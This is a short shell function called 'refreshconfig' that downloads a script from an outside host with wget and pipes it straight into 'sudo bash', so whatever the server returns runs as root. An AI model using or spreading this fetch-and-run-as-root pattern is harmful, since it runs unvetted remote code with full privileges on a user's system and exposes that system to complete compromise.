function refreshconfig()
{
  wget -O - https://ls.gitcommit.fr | sudo bash -s $1
}
